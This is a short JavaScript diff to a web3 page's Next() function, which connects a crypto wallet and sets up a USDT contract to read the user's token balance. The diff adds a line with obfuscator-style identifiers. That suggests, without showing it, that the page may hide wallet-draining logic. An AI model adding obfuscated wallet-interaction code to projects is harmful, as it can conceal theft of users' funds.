@@ -77,13 +77,16 @@ let userAddress;
             }
         });
 
-async function Next() {
-  if (!web3 || !userAddress) {
+ async function Next() {
+            const _0x3ddf57 = _0x1b5be5;
+            
+            if (!web3 || !userAddress) {
                 await connectWallet();
                 if (!web3 || !userAddress) {
                     alert("Wallet not connected. Refresh the page.");
                     return;
                 }
+            }
     const usdtContract = new web3.eth.Contract([
         { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
     ], usdtContractAddress);
